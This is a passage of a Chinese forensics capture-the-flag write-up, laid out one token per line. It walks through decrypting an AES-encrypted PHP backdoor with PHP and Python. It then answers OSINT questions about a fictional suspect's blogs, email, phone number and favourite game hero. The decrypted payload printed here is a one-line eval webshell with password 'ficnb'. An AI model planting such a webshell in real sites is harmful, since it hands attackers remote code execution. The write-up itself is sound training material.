+$base64DecodedData
+,
+0
+,
+$ivLength
+);
+// 提取IV（初始化向量）
+$encryptedPayload
+=
+substr
+(
+$base64DecodedData
+,
+$ivLength
+);
+// 剩余部分是加密数据
+echo
+base64_encode
+(
+$iv
+);
+echo
+"<br />"
+;
+echo
+base64_encode
+(
+$encryptedPayload
+);
+echo
+"<br />"
+;
+// 解密数据（PHP代码）
+$decryptedPhpCode
+=
+openssl_decrypt
+(
+$encryptedPayload
+,
+$cipherMethod
+,
+$aesKey
+,
+OPENSSL_RAW_DATA
+,
+$iv
+);
+echo
+$decryptedPhpCode
+;
+>
+解密结果为:
+PHP
+function yijuhua() {
+echo "Kangle) is OK! FICer is good!";
+eval($_POST[ficnb])
+}
+因此后门密码为
+ficnb
+.
+不过解密逻辑很简单, 直接上 Python 比 php 做还快一点. 唯一要注意的一点是 OpenSSL 库中会自动对长度不足的密钥进行左侧补零, 但 Python 中需要自行填充:
+Python
+import
+hashlib
+import
+requests
+import
+base64
+"""
+css_url = 'https://foren6.atwebpages.com/woyao/eat/%E7%81%AB%E9%94%85/%E8%9C%82%E8%9C%9C%E9%94%85%E5%BA%95.css'
+response = requests.get(css_url)
+response.raise_for_status()
+css_content = response.content
+"""
+css_content
+=
+open
+(
+"./蜂蜜锅底.css"
+,
+"rb"
+)
+.
+read
+()
+aes_key
+=
+hashlib
+.
+md5
+(
+css_content
+)
+.
+digest
+()
+.
+ljust
+(
+32
+,
+b
+'
+\x00
+'
+)
+encrypted_data
+=
+open
+(
+'./encrypted.bin'
+,
+'rb'
+)
+.
+read
+()
+base64_decoded_data
+=
+base64
+.
+b64decode
+(
+encrypted_data
+)
+iv
+=
+base64_decoded_data
+[
+:
+16
+]
+encrypted_payload
+=
+base64_decoded_data
+[
+16
+:
+]
+from
+Crypto.Cipher
+import
+AES
+from
+Crypto.Util.Padding
+import
+unpad
+cipher
+=
+AES
+.
+new
+(
+aes_key
+,
+AES
+.
+MODE_CBC
+,
+iv
+=
+iv
+)
+decrypted_data
+=
+cipher
+.
+decrypt
+(
+encrypted_payload
+)
+decrypted_php_code
+=
+unpad
+(
+decrypted_data
+,
+AES
+.
+block_size
+)
+.
+decode
+(
+'utf-8'
+)
+with
+open
+(
+"out.php"
+,
+"w"
+)
+as
+f
+:
+f
+.
+write
+(
+"<?php
+\n
+"
++
+decrypted_php_code
+)
+12.请访问陈某当前博客，陈某课程的扫码报名地址的域名为
+¶
+fic.forensix.cn
+我们访问陈某的博客, 可以看到一个明显的二维码:
+我们在该页面的右侧可以看到标题为
+hns建站流程
+的帖子, 如果第 9 题之前没有做出来的, 可以参考该帖子内容.
+(小声蛐蛐一下, 在这个题目中, "扫码参加课程学习渗透黑客技术, 日入 5 位" 对应着竞赛官网
+fic.forensix.cn
+...)
+13.通过互联网找到陈某的旧博客网站标题为
+¶
+柳如烟大战霸天虎
+在博客的
+header
+部分, 有一个跳转到旧博客的超链接
+http://forensix2025.work.gd/
+, 但是该网页已经废弃了，因此我们尝试搜索该网页的先前镜像:
+来自 WikiPedia:
+网站时光机
+(Wayback Machine)是万维网的数字档案馆, 由位于美国加利福尼亚州旧金山的非营利组织互联网档案馆创建, 亦为该组织最重要的服务之一. 它允许用户"回到过去", 查看过去的网站的样子. 其创始人布鲁斯特·卡利和 Bruce Gilliat 开发了网站时光机, 旨在通过保存已失效网页的存档副本, 以"普及所有知识"(universal access to all knowledge). 自 2001 年推出以来, 截至 2024 年 1 月 3 日, 网站时光机已存档超过 8600 亿个网页和超过 99 PB 的数据
+我们打开 2025.04.07 的网页镜像:
+可以看到标题为"柳如烟大战霸天虎"
+14.陈某的姓名为
+¶
+陈浩北
+见上题
+15.陈某的邮箱地址为
+¶
+mailme@chen.foren6
+直接查看网页源码, 搜索
+@
+:
+16.陈某的 11 位手机号为
+¶
+13170010703
+见上题.
+17.陈某最爱的 dota 英雄为
+¶
+邪影芳灵
+根据旧博客的内容"圣刀会也没我这么厉害", 关键词检索一下:
+看了一堆设定, 我们一致推测是幻影刺客, 因为圣刀会是一个刺客组织(
+DeepSeek
+也是这么建议).
+Gemini
+则没有相关知识.
+最后才知道:
+好好好，这真的有点难评...
